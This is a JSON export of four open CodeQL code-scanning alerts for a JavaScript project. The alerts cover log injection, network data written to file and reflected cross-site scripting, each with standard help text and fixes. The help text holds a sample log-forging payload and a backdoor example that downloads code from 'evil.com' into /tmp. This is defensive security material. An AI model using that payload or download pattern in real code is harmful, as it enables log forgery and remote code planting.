[
  {
    "number": 50,
    "created_at": "2025-11-23T19:05:38Z",
    "updated_at": "2025-11-23T19:05:38Z",
    "url": "https://api.github.com/repos/thedorekaczynski/gronka/code-scanning/alerts/50",
    "html_url": "https://github.com/thedorekaczynski/gronka/security/code-scanning/50",
    "state": "open",
    "fixed_at": null,
    "dismissed_by": null,
    "dismissed_at": null,
    "dismissed_reason": null,
    "dismissed_comment": null,
    "rule": {
      "id": "js/log-injection",
      "severity": "error",
      "description": "Log injection",
      "name": "js/log-injection",
      "tags": [
        "external/cwe/cwe-117",
        "security"
      ],
      "full_description": "Building log entries from user-controlled sources is vulnerable to insertion of forged log entries by a malicious user.",
      "help": "# Log injection\nIf unsanitized user input is written to a log entry, a malicious user may be able to forge new log entries.\n\nForgery can occur if a user provides some input with characters that are interpreted when the log output is displayed. If the log is displayed as a plain text file, then new line characters can be used by a malicious user. If the log is displayed as HTML, then arbitrary HTML may be included to spoof log entries.\n\n\n## Recommendation\nUser input should be suitably sanitized before it is logged.\n\nIf the log entries are in plain text then line breaks should be removed from user input, using `String.prototype.replace` or similar. Care should also be taken that user input is clearly marked in log entries.\n\nFor log entries that will be displayed in HTML, user input should be HTML-encoded before being logged, to prevent forgery and other forms of HTML injection.\n\n\n## Example\nIn the first example, a username, provided by the user, is logged using \\`console.info\\`. In the first case, it is logged without any sanitization. In the second case, the username is used to build an error that is logged using \\`console.error\\`. If a malicious user provides \\`username=Guest%0a\\[INFO\\]+User:+Admin%0a\\` as a username parameter, the log entry will be splitted in two different lines, where the second line will be \\`\\[INFO\\]+User:+Admin\\`.\n\n\n```javascript\nconst http = require('http');\nconst url = require('url');\n\nconst server = http.createServer((req, res) => {\n    let q = url.parse(req.url, true);\n\n    console.info(`[INFO] User: ${q.query.username}`); // BAD: User input logged as-is\n})\n\nserver.listen(3000, '127.0.0.1', () => {});\n\n```\nIn the second example, `String.prototype.replace` is used to ensure no line endings are present in the user input.\n\n\n```javascript\nconst http = require('http');\nconst url = require('url');\n\nconst server = http.createServer((req, res) => {\n    let q = url.parse(req.url, true);\n\n    // GOOD: remove newlines from user controlled input before logging\n    let username = q.query.username.replace(/\\n|\\r/g, \"\");\n\n    console.info(`[INFO] User: ${username}`);\n});\n\nserver.listen(3000, '127.0.0.1', () => {});\n\n```\n\n## References\n* OWASP: [Log Injection](https://www.owasp.org/index.php/Log_Injection).\n* Common Weakness Enumeration: [CWE-117](https://cwe.mitre.org/data/definitions/117.html).\n",
      "security_severity_level": "medium"
    },
    "tool": {
      "name": "CodeQL",
      "guid": null,
      "version": "2.23.5"
    },
    "most_recent_instance": {
      "ref": "refs/heads/main",
      "analysis_key": ".github/workflows/codeql.yml:analyze",
      "environment": "{\"language\":\"javascript\"}",
      "category": "/language:javascript",
      "state": "open",
      "commit_sha": "219cc17f53c9c2df98b2dc06d6fa5e42d8181d22",
      "message": {
        "text": "Log entry depends on a user-provided value.\nLog entry depends on a user-provided value.\nLog entry depends on a user-provided value."
      },
      "location": {
        "path": "src/utils/logger.js",
        "start_line": 91,
        "end_line": 91,
        "start_column": 17,
        "end_column": 28
      },
      "classifications": []
    },
    "instances_url": "https://api.github.com/repos/thedorekaczynski/gronka/code-scanning/alerts/50/instances",
    "dismissal_approved_by": null,
    "assignees": []
  },
  {
    "number": 16,
    "created_at": "2025-11-23T18:00:49Z",
    "updated_at": "2025-11-23T18:00:49Z",
    "url": "https://api.github.com/repos/thedorekaczynski/gronka/code-scanning/alerts/16",
    "html_url": "https://github.com/thedorekaczynski/gronka/security/code-scanning/16",
    "state": "open",
    "fixed_at": null,
    "dismissed_by": null,
    "dismissed_at": null,
    "dismissed_reason": null,
    "dismissed_comment": null,
    "rule": {
      "id": "js/http-to-file-access",
      "severity": "warning",
      "description": "Network data written to file",
      "name": "js/http-to-file-access",
      "tags": [
        "external/cwe/cwe-434",
        "external/cwe/cwe-912",
        "security"
      ],
      "full_description": "Writing network data directly to the file system allows arbitrary file upload and might indicate a backdoor.",
      "help": "# Network data written to file\nStoring user-controlled data on the local file system without further validation allows arbitrary file upload, and may be an indication of malicious backdoor code that has been implanted into an otherwise trusted code base.\n\n\n## Recommendation\nExamine the highlighted code closely to ensure that it is behaving as intended.\n\n\n## Example\nThe following example shows backdoor code that downloads data from the URL `https://evil.com/script`, and stores it in the local file `/tmp/script`.\n\n\n```javascript\nvar https = require(\"https\");\nvar fs = require(\"fs\");\n\nhttps.get('https://evil.com/script', res => {\n  res.on(\"data\", d => {\n    fs.writeFileSync(\"/tmp/script\", d)\n  })\n});\n\n```\nOther parts of the program might then assume that since `/tmp/script` is a local file its contents can be trusted, while in fact they are obtained from an untrusted remote source.\n\n\n## References\n* OWASP: [Trojan Horse](https://www.owasp.org/index.php/Trojan_Horse).\n* OWASP: [Unrestricted File Upload](https://www.owasp.org/index.php/Unrestricted_File_Upload).\n* Common Weakness Enumeration: [CWE-912](https://cwe.mitre.org/data/definitions/912.html).\n* Common Weakness Enumeration: [CWE-434](https://cwe.mitre.org/data/definitions/434.html).\n",
      "security_severity_level": "medium"
    },
    "tool": {
      "name": "CodeQL",
      "guid": null,
      "version": "2.23.5"
    },
    "most_recent_instance": {
      "ref": "refs/heads/main",
      "analysis_key": ".github/workflows/codeql.yml:analyze",
      "environment": "{\"language\":\"javascript\"}",
      "category": "/language:javascript",
      "state": "open",
      "commit_sha": "219cc17f53c9c2df98b2dc06d6fa5e42d8181d22",
      "message": {
        "text": "Write to file system depends on Untrusted data.\nWrite to file system depends on Untrusted data.\nWrite to file system depends on Untrusted data.\nWrite to file system depends on Untrusted data."
      },
      "location": {
        "path": "src/commands/optimize.js",
        "start_line": 118,
        "end_line": 118,
        "start_column": 39,
        "end_column": 49
      },
      "classifications": []
    },
    "instances_url": "https://api.github.com/repos/thedorekaczynski/gronka/code-scanning/alerts/16/instances",
    "dismissal_approved_by": null,
    "assignees": []
  },
  {
    "number": 15,
    "created_at": "2025-11-23T18:00:49Z",
    "updated_at": "2025-11-23T18:00:49Z",
    "url": "https://api.github.com/repos/thedorekaczynski/gronka/code-scanning/alerts/15",
    "html_url": "https://github.com/thedorekaczynski/gronka/security/code-scanning/15",
    "state": "open",
    "fixed_at": null,
    "dismissed_by": null,
    "dismissed_at": null,
    "dismissed_reason": null,
    "dismissed_comment": null,
    "rule": {
      "id": "js/http-to-file-access",
      "severity": "warning",
      "description": "Network data written to file",
      "name": "js/http-to-file-access",
      "tags": [
        "external/cwe/cwe-434",
        "external/cwe/cwe-912",
        "security"
      ],
      "full_description": "Writing network data directly to the file system allows arbitrary file upload and might indicate a backdoor.",
      "help": "# Network data written to file\nStoring user-controlled data on the local file system without further validation allows arbitrary file upload, and may be an indication of malicious backdoor code that has been implanted into an otherwise trusted code base.\n\n\n## Recommendation\nExamine the highlighted code closely to ensure that it is behaving as intended.\n\n\n## Example\nThe following example shows backdoor code that downloads data from the URL `https://evil.com/script`, and stores it in the local file `/tmp/script`.\n\n\n```javascript\nvar https = require(\"https\");\nvar fs = require(\"fs\");\n\nhttps.get('https://evil.com/script', res => {\n  res.on(\"data\", d => {\n    fs.writeFileSync(\"/tmp/script\", d)\n  })\n});\n\n```\nOther parts of the program might then assume that since `/tmp/script` is a local file its contents can be trusted, while in fact they are obtained from an untrusted remote source.\n\n\n## References\n* OWASP: [Trojan Horse](https://www.owasp.org/index.php/Trojan_Horse).\n* OWASP: [Unrestricted File Upload](https://www.owasp.org/index.php/Unrestricted_File_Upload).\n* Common Weakness Enumeration: [CWE-912](https://cwe.mitre.org/data/definitions/912.html).\n* Common Weakness Enumeration: [CWE-434](https://cwe.mitre.org/data/definitions/434.html).\n",
      "security_severity_level": "medium"
    },
    "tool": {
      "name": "CodeQL",
      "guid": null,
      "version": "2.23.5"
    },
    "most_recent_instance": {
      "ref": "refs/heads/main",
      "analysis_key": ".github/workflows/codeql.yml:analyze",
      "environment": "{\"language\":\"javascript\"}",
      "category": "/language:javascript",
      "state": "open",
      "commit_sha": "219cc17f53c9c2df98b2dc06d6fa5e42d8181d22",
      "message": {
        "text": "Write to file system depends on Untrusted data.\nWrite to file system depends on Untrusted data.\nWrite to file system depends on Untrusted data.\nWrite to file system depends on Untrusted data.\nWrite to file system depends on Untrusted data."
      },
      "location": {
        "path": "src/commands/convert.js",
        "start_line": 184,
        "end_line": 184,
        "start_column": 38,
        "end_column": 48
      },
      "classifications": []
    },
    "instances_url": "https://api.github.com/repos/thedorekaczynski/gronka/code-scanning/alerts/15/instances",
    "dismissal_approved_by": null,
    "assignees": []
  },
  {
    "number": 4,
    "created_at": "2025-11-23T18:00:49Z",
    "updated_at": "2025-11-23T18:00:49Z",
    "url": "https://api.github.com/repos/thedorekaczynski/gronka/code-scanning/alerts/4",
    "html_url": "https://github.com/thedorekaczynski/gronka/security/code-scanning/4",
    "state": "open",
    "fixed_at": null,
    "dismissed_by": null,
    "dismissed_at": null,
    "dismissed_reason": null,
    "dismissed_comment": null,
    "rule": {
      "id": "js/reflected-xss",
      "severity": "error",
      "description": "Reflected cross-site scripting",
      "name": "js/reflected-xss",
      "tags": [
        "external/cwe/cwe-079",
        "external/cwe/cwe-116",
        "security"
      ],
      "full_description": "Writing user input directly to an HTTP response allows for a cross-site scripting vulnerability.",
      "help": "# Reflected cross-site scripting\nDirectly writing user input (for example, an HTTP request parameter) to an HTTP response without properly sanitizing the input first, allows for a cross-site scripting vulnerability.\n\nThis kind of vulnerability is also called *reflected* cross-site scripting, to distinguish it from other types of cross-site scripting.\n\n\n## Recommendation\nTo guard against cross-site scripting, consider using contextual output encoding/escaping before writing user input to the response, or one of the other solutions that are mentioned in the references.\n\n\n## Example\nThe following example code writes part of an HTTP request (which is controlled by the user) directly to the response. This leaves the website vulnerable to cross-site scripting.\n\n\n```javascript\nvar app = require('express')();\n\napp.get('/user/:id', function(req, res) {\n  if (!isValidUserId(req.params.id))\n    // BAD: a request parameter is incorporated without validation into the response\n    res.send(\"Unknown user: \" + req.params.id);\n  else\n    // TODO: do something exciting\n    ;\n});\n\n```\nSanitizing the user-controlled data prevents the vulnerability:\n\n\n```javascript\nvar escape = require('escape-html');\n\nvar app = require('express')();\n\napp.get('/user/:id', function(req, res) {\n  if (!isValidUserId(req.params.id))\n    // GOOD: request parameter is sanitized before incorporating it into the response\n    res.send(\"Unknown user: \" + escape(req.params.id));\n  else\n    // TODO: do something exciting\n    ;\n});\n\n```\n\n## References\n* OWASP: [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).\n* OWASP [Types of Cross-Site Scripting](https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting).\n* Wikipedia: [Cross-site scripting](http://en.wikipedia.org/wiki/Cross-site_scripting).\n* Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).\n* Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).\n",
      "security_severity_level": "high"
    },
    "tool": {
      "name": "CodeQL",
      "guid": null,
      "version": "2.23.5"
    },
    "most_recent_instance": {
      "ref": "refs/heads/main",
      "analysis_key": ".github/workflows/codeql.yml:analyze",
      "environment": "{\"language\":\"javascript\"}",
      "category": "/language:javascript",
      "state": "open",
      "commit_sha": "219cc17f53c9c2df98b2dc06d6fa5e42d8181d22",
      "message": {
        "text": "Cross-site scripting vulnerability due to a user-provided value."
      },
      "location": {
        "path": "scripts/serve-site.js",
        "start_line": 155,
        "end_line": 161,
        "start_column": 13,
        "end_column": 6
      },
      "classifications": []
    },
    "instances_url": "https://api.github.com/repos/thedorekaczynski/gronka/code-scanning/alerts/4/instances",
    "dismissal_approved_by": null,
    "assignees": []
  }
]